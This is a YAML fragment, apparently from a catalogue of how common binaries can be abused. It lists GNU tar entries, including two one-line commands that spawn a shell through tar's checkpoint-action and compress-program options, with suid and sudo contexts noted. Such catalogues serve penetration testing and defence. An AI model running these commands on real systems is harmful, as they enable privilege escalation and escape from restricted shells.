                suid: null
                unprivileged: null
              version: GNU
            shell:
            - code: tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
              contexts:
                sudo: null
                suid:
                  shell: true
                unprivileged: null
            - code: tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
